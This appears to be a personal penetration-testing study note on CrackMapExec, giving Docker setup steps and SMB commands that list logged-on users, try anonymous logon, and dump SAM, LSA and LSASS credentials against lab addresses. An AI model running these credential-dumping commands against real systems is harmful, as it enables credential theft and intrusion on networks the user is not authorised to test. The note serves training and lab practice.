## CrackMapExec

I tried playing around with this on Win10/7 and I couldn't get it to dump any creds.  I may come back to it one day.

### Docker Installation

```bash
sudo docker pull byt3bl33d3r/crackmapexec
```

Set up a named instance of the container:

```bash
sudo docker run -it --entrypoint=/bin/bash --name crackmapexec -v ~/.cme:/root/.cme byt3bl33d3r/crackmapexec
```

Executing the above command will bring you to a prompt inside your docker container.

### Starting the Docker Container

After the initial setup of a named instance of the container, you can restart it using the following commands:

```bash
sudo docker start crackmapexec
sudo docker exec -it crackmapexec /bin/bash
```

### Useful Commands

```bash
# Show Help
cme -h
```

#### SMB

```bash
# Show logged on users
cme smb 192.168.229.130 -u coyote -p oscp --loggedon-users

# Anonymous logon (make sure password is empty)
cme smb 10.10.10.178 -u 'a' -p ''

# Dump SAM hashes using local account
cme smb 192.168.229.130 -u coyote -p oscp --local-auth --sam

# Dump LSA 
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

# Dump LSASS
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' -M lsassy
```



### Documentation

https://mpgn.gitbook.io/crackmapexec/getting-started/selecting-and-using-a-protocol

https://github.com/byt3bl33d3r/CrackMapExec/wiki/